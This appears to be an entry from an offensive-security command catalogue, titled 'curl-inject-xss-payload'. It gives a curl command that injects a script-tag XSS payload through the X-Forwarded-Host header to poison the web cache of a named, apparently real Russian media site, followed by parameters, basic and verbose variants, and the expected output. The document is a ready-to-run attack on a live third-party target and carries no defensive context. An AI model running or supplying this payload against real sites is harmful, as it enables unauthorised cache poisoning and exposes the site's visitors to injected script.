---
data: >-
  curl -H "X-Forwarded-Host: \"><script>alert('XSS')</script>"
  https://okmedia.insideok.ru/
tags:
  - injection
  - xss
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9ff5ea09-dded-48b1-b13e-cd983b885146
created_at: '2025-12-13T09:00:33.947Z'
updated_at: '2025-12-13T09:00:33.947Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss-payload

## Command

```bash
curl -H "X-Forwarded-Host: \"><script>alert('XSS')</script>" https://okmedia.insideok.ru/
```

## Description

This command injects an XSS payload into the X-Forwarded-Host header to poison the web cache, embedding malicious script for stored execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-Forwarded-Host: payload"` | Sets the malicious host with XSS | Yes |
| `https://okmedia.insideok.ru/` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Forwarded-Host: \"><script>alert('XSS')</script>" https://okmedia.insideok.ru/
```

### Advanced Usage

```bash
curl -H "X-Forwarded-Host: \"><script>alert('XSS')</script>" -v https://okmedia.insideok.ru/
```

## Expected Output

Server accepts the request, poisoning the cache; no immediate output beyond standard HTTP response.

## Related

- [[commands/curl-set-x-forwarded-host]]
- [[procedures/Inject-Malicious-Host-for-Cache-Poisoning]]
